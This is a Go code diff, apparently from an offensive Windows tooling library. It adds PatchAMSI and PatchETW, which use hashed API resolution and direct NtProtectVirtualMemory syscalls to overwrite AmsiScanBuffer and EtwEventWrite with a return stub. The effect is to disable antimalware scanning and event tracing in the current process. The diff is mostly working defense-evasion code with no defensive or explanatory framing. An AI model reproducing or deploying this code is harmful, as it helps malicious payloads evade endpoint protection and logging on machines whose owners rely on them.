@@ -38,6 +38,46 @@ func GetFunctionHash(functionName string) uint32 {
 	return obf.GetHash(functionName)
 }
 
+// StringToUTF16 converts a Go string to a UTF16 string pointer
+// This replaces syscall.UTF16PtrFromString to avoid standard library dependencies
+func StringToUTF16(s string) *uint16 {
+	if s == "" {
+		// Return pointer to null terminator for empty strings
+		nullTerm := uint16(0)
+		return &nullTerm
+	}
+	
+	// Convert string to runes first (handles Unicode properly)
+	runes := []rune(s)
+	
+	// Allocate buffer for UTF16 + null terminator
+	utf16Slice := make([]uint16, 0, len(runes)+1)
+	
+	// Convert each rune to UTF16
+	for _, r := range runes {
+		if r < 0x10000 {
+			// Basic Multilingual Plane - single UTF16 unit
+			utf16Slice = append(utf16Slice, uint16(r))
+		} else {
+			// Supplementary plane - needs surrogate pair
+			r -= 0x10000
+			high := uint16((r>>10)&0x3FF) + 0xD800  // High surrogate
+			low := uint16(r&0x3FF) + 0xDC00         // Low surrogate
+			utf16Slice = append(utf16Slice, high, low)
+		}
+	}
+	
+	// Add null terminator
+	utf16Slice = append(utf16Slice, 0)
+	
+	// Return pointer to first element
+	return &utf16Slice[0]
+}
+
+
+
+
+
 // Common Windows API functions with proper type safety
 
 // NtAllocateVirtualMemory allocates memory in a process
@@ -867,4 +907,147 @@ func IsNTStatusError(status uintptr) bool {
 // IsNTStatusWarning checks if an NTSTATUS code indicates a warning
 func IsNTStatusWarning(status uintptr) bool {
 	return (status >> 30) == 2 // Severity bits = 10 (warning)
+}
+
+// ----------------------------------------------------------------------------
+// PatchAMSI
+//
+// Patches AmsiScanBuffer in-memory so that it immediately returns (RET).
+//
+// Steps:
+//  1. LdrGetDllHandle("amsi.dll")            → amsiBase
+//  2. LdrGetProcedureAddress(amsiBase, "AmsiScanBuffer") → targetAddr
+//  3. NtProtectVirtualMemory(currentProcess, &targetAddr, len(patch), PAGE_EXECUTE_READWRITE, &oldProtect)
+//  4. write 0xC3 at targetAddr
+//  5. NtProtectVirtualMemory(currentProcess, &targetAddr, len(patch), oldProtect, &_) 
+//
+// This uses only direct syscalls (no Win32 imports). 
+// ----------------------------------------------------------------------------- 
+func PatchAMSI() error {
+	// 1. Get the base address of amsi.dll using existing codebase methods
+	amsiHash := obf.GetHash("amsi.dll")
+	amsiBase := syscallresolve.GetModuleBase(amsiHash)
+	if amsiBase == 0 {
+		return fmt.Errorf("amsi.dll not found (not loaded)")
+	}
+
+	// 2. Get the address of AmsiScanBuffer using existing PE parsing
+	functionHash := obf.GetHash("AmsiScanBuffer")
+	procAddr := syscallresolve.GetFunctionAddress(amsiBase, functionHash)
+	if procAddr == 0 {
+		return fmt.Errorf("AmsiScanBuffer function not found")
+	}
+
+	// 3. Change protection to RWX for that page
+	//    Use the "current process" pseudo‐handle (–1 or 0xFFFFFFFFFFFFFFFF).
+	const (
+		currentProcess      = ^uintptr(0)  // (ULONG_PTR)(-1)
+		PAGE_EXEC_READWRITE = 0x40         // PAGE_EXECUTE_READWRITE
+	)
+	patch := []byte{0x31, 0xC0, 0xC3} // xor eax, eax; ret
+	patchSize := uintptr(len(patch))
+	oldProtect := uintptr(0)
+	status, err := DirectSyscall(
+		"NtProtectVirtualMemory",
+		currentProcess,
+		uintptr(unsafe.Pointer(&procAddr)),
+		uintptr(unsafe.Pointer(&patchSize)),
+		uintptr(PAGE_EXEC_READWRITE),
+		uintptr(unsafe.Pointer(&oldProtect)))
+	if err != nil {
+		return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
+	}
+	if !IsNTStatusSuccess(status) {
+		return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
+	}
+
+	// 4. Overwrite with the patch bytes
+	for i := 0; i < len(patch); i++ {
+		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
+	}
+
+	// 5. Restore the original protection
+	status, _ = DirectSyscall(
+		"NtProtectVirtualMemory",
+		currentProcess,
+		uintptr(unsafe.Pointer(&procAddr)),
+		uintptr(unsafe.Pointer(&patchSize)),
+		oldProtect,
+		uintptr(unsafe.Pointer(&oldProtect))) // we discard the new "oldProtect" here
+	if !IsNTStatusSuccess(status) {
+		return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
+	}
+
+	return nil
+}
+
+// ----------------------------------------------------------------------------
+// PatchETW
+//
+// Patches EtwEventWrite in-memory so that it immediately returns (RET).
+//
+// Steps:
+//  1. LdrGetDllHandle("ntdll.dll")            → ntdllBase
+//  2. LdrGetProcedureAddress(ntdllBase, "EtwEventWrite") → targetAddr
+//  3. NtProtectVirtualMemory(currentProcess, &targetAddr, len(patch), PAGE_EXECUTE_READWRITE, &oldProtect)
+//  4. write 0xC3 at targetAddr
+//  5. NtProtectVirtualMemory(currentProcess, &targetAddr, len(patch), oldProtect, &_) 
+//
+// This also uses only direct syscalls. 
+// -----------------------------------------------------------------------------
+func PatchETW() error {
+	// 1. Get the base address of ntdll.dll using existing codebase methods
+	ntdllHash := obf.GetHash("ntdll.dll")
+	ntdllBase := syscallresolve.GetModuleBase(ntdllHash)
+	if ntdllBase == 0 {
+		return fmt.Errorf("ntdll.dll not found")
+	}
+
+	// 2. Get the address of EtwEventWrite using existing PE parsing
+	functionHash := obf.GetHash("EtwEventWrite")
+	procAddr := syscallresolve.GetFunctionAddress(ntdllBase, functionHash)
+	if procAddr == 0 {
+		return fmt.Errorf("EtwEventWrite function not found")
+	}
+
+	// 3. Change protection to RWX for that page
+	const (
+		currentProcess      = ^uintptr(0)
+		PAGE_EXEC_READWRITE = 0x40
+	)
+	patch := []byte{0x31, 0xC0, 0xC3} // xor eax, eax; ret
+	patchSize := uintptr(len(patch))  // Fixed: use actual patch size (3 bytes)
+	oldProtect := uintptr(0)
+	status, err := DirectSyscall(
+		"NtProtectVirtualMemory",
+		currentProcess,
+		uintptr(unsafe.Pointer(&procAddr)),
+		uintptr(unsafe.Pointer(&patchSize)),
+		uintptr(PAGE_EXEC_READWRITE),
+		uintptr(unsafe.Pointer(&oldProtect)))
+	if err != nil {
+		return fmt.Errorf("NtProtectVirtualMemory (make RWX) failed: %v", err)
+	}
+	if !IsNTStatusSuccess(status) {
+		return fmt.Errorf("NtProtectVirtualMemory (make RWX) returned: %s", FormatNTStatus(status))
+	}
+
+	// 4. Overwrite with the patch bytes
+	for i := 0; i < len(patch); i++ {
+		*(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = patch[i]
+	}
+
+	// 5. Restore the original protection
+	status, _ = DirectSyscall(
+		"NtProtectVirtualMemory",
+		currentProcess,
+		uintptr(unsafe.Pointer(&procAddr)),
+		uintptr(unsafe.Pointer(&patchSize)),
+		oldProtect,
+		uintptr(unsafe.Pointer(&oldProtect)))
+	if !IsNTStatusSuccess(status) {
+		return fmt.Errorf("NtProtectVirtualMemory (restore) returned: %s", FormatNTStatus(status))
+	}
+
+	return nil
 } 
